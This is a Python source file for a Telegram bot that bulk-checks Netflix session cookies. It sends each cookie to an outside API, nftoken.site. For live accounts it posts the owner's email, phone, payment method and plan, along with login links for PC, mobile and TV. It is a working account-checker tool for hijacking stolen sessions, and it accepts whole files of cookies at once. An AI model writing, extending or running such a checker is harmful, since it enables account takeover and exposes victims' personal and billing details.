import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import time
import threading
import os
from flask import Flask

# ==========================================
# 🔧 CONFIGURATION - Environment Variables
# ==========================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "PUT_YOUR_TOKEN_HERE")
NFTOKEN_API_KEY = os.environ.get("NFTOKEN_API_KEY", "PUT_YOUR_API_KEY_HERE")
API_URL = "https://nftoken.site/v1/api.php"
# ==========================================

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
app = Flask(__name__)

# ---------- Core processing function ----------
def process_single_cookie(chat_id, msg_id, cookie_text):
    payload = {
        "key": NFTOKEN_API_KEY,
        "cookie": cookie_text
    }

    try:
        response = requests.post(API_URL, json=payload, timeout=20)
        data = response.json()

        if data.get("status") == "SUCCESS":
            email = data.get("x_mail", "N/A")
            plan = data.get("x_tier", "Unknown")
            country = data.get("x_loc", "N/A")
            renewal = data.get("x_ren", "N/A")
            since = data.get("x_mem", "N/A")
            payment = data.get("x_bil", "N/A")
            phone = data.get("x_tel", "N/A")
            profiles = data.get("x_usr", "N/A")
            
            pc_link = data.get("x_l1", "#")
            mobile_link = data.get("x_l2", "#")
            tv_link = data.get("x_l3", "#")

            result_text = (
                f"✅ *SUCCESS* | `{email}`\n"
                f"──────────────────\n"
                f"📺 *Plan:* `{plan}`\n"
                f"🌍 *Country:* `{country}`\n"
                f"📅 *Renewal:* `{renewal}`\n"
                f"📆 *Since:* `{since}`\n"
                f"💳 *Payment:* `{payment}`\n"
                f"📞 *Phone:* `{phone}`\n"
                f"👤 *Profiles:* `{profiles}`\n"
                f"──────────────────"
            )
            
            markup = InlineKeyboardMarkup()
            buttons = []
            if pc_link.startswith("http"):
                buttons.append(InlineKeyboardButton("💻 PC", url=pc_link))
            if mobile_link.startswith("http"):
                buttons.append(InlineKeyboardButton("📱 Mobile", url=mobile_link))
            if tv_link.startswith("http"):
                buttons.append(InlineKeyboardButton("📺 TV", url=tv_link))
            if buttons:
                markup.row(*buttons)

            bot.edit_message_text(result_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
        
        elif data.get("status") == "ERROR" and response.status_code == 429:
            error_msg = data.get("message", "Rate limit exceeded.")
            bot.edit_message_text(f"🚫 *RATE LIMITED*\n{error_msg}", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown")
        
        else:
            error_msg = data.get("message", "Invalid or Dead Cookie")
            bot.edit_message_text(f"💀 *DEAD ACCOUNT*\n{error_msg}", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown")

    except Exception as e:
        bot.edit_message_text("🚨 *System Error:* Could not connect to API.", chat_id=chat_id, message_id=msg_id, parse_mode="Markdown")

# ---------- Single cookie handler ----------
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "🤖 *Welcome to the Checker Bot!*\n\n"
        "Simply paste your Netflix cookie (JSON or Netscape format) "
        "directly into this chat, and I will check it for you.\n\n"
        "📎 You can also send a `.txt` file containing multiple cookies "
        "(one per line) and I will check all of them."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True, content_types=['text'])
def check_cookie(message):
    raw_text = message.text.strip()
    if "netflix" not in raw_text.lower() and "NetflixId" not in raw_text and "{" not in raw_text:
        bot.reply_to(message, "❌ Please send a valid cookie string.")
        return

    status_msg = bot.reply_to(message, "⏳ *Checking cookie...*", parse_mode="Markdown")
    process_single_cookie(message.chat.id, status_msg.message_id, raw_text)

# ---------- File handler (multiple cookies) ----------
@bot.message_handler(content_types=['document'])
def handle_document(message):
    file_info = bot.get_file(message.document.file_id)
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please send a `.txt` file with one cookie per line.")
        return

    downloaded_file = bot.download_file(file_info.file_path)
    file_content = downloaded_file.decode('utf-8', errors='ignore')
    lines = [line.strip() for line in file_content.splitlines() if line.strip()]

    if not lines:
        bot.reply_to(message, "⚠️ The file is empty or contains no valid cookies.")
        return

    start_msg = bot.reply_to(message, f"📂 *Processing {len(lines)} cookies...*", parse_mode="Markdown")

    for idx, cookie in enumerate(lines, 1):
        temp_msg = bot.send_message(message.chat.id, f"⏳ Checking cookie #{idx}...")
        process_single_cookie(message.chat.id, temp_msg.message_id, cookie)
        time.sleep(1)  # delay to avoid rate limit

    bot.send_message(message.chat.id, f"✅ *Finished checking all {len(lines)} cookies.*", parse_mode="Markdown")

# ---------- Flask route for health check ----------
@app.route('/')
def health_check():
    return "OK", 200

# ---------- Function to start bot polling in background ----------
def start_bot():
    print("🤖 Bot is starting...")
    bot.infinity_polling()

# ---------- Main entry point ----------
if __name__ == "__main__":
    # Run bot in a separate thread so Flask can serve the web server
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # Start Flask web server (Render expects a web server)
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
